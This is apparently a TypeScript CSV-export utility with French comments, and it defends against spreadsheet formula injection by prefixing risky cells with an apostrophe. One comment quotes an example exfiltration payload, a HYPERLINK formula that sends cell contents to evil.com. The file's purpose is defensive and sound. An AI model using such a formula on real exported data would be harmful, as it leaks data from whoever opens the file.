/**
 * Caractères qui font interpréter une cellule comme une **formule** par Excel,
 * LibreOffice et Google Sheets.
 *
 * La tabulation et le retour chariot sont inclus : les tableurs les ignorent
 * en tête de cellule et évaluent ce qui suit, ce qui permet de contourner un
 * filtre qui ne regarderait que `=`, `+`, `-` et `@`.
 */
const FORMULA_PREFIXES = ['=', '+', '-', '@', '\t', '\r'];

/**
 * Neutralise l'injection de formule (CSV injection).
 *
 * Les colonnes exportées contiennent des données saisies par des utilisateurs
 * externes — nom, email et téléphone des clients, adresse de livraison. Une
 * valeur comme `=HYPERLINK("http://evil.com?d="&A1,"Facture")` entrée comme
 * nom de client était écrite telle quelle dans le fichier, puis **exécutée sur
 * le poste de l'administrateur** à l'ouverture du CSV. L'échappement RFC 4180
 * (guillemets, virgules) ne protège pas de cela : il traite la structure du
 * fichier, pas l'interprétation des cellules.
 *
 * On préfixe d'une apostrophe, convention comprise par les trois tableurs :
 * la cellule est traitée comme du texte et l'apostrophe n'est pas affichée.
 */
function neutralizeFormula(value: string): string {
  return FORMULA_PREFIXES.some((p) => value.startsWith(p)) ? `'${value}` : value;
}

export function exportToCsv(filename: string, rows: Record<string, unknown>[]) {
  if (!rows.length) return;

  const headers = Object.keys(rows[0]!);
  const escape = (v: unknown) => {
    const raw = v === null || v === undefined ? '' : String(v);
    const s = neutralizeFormula(raw);
    // Échappement structurel RFC 4180, appliqué APRÈS la neutralisation :
    // l'apostrophe ajoutée doit se retrouver à l'intérieur des guillemets.
    return s.includes(',') || s.includes('"') || s.includes('\n')
      ? `"${s.replace(/"/g, '""')}"`
      : s;
  };

  const csv = [
    headers.map(escape).join(','),
    ...rows.map((r) => headers.map((h) => escape(r[h])).join(',')),
  ].join('\n');

  // BOM UTF-8 : sans lui, Excel affiche les accents en mojibake.
  const blob = new Blob(['\uFEFF' + csv], { type: 'text/csv;charset=utf-8;' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  a.click();
  URL.revokeObjectURL(url);
}
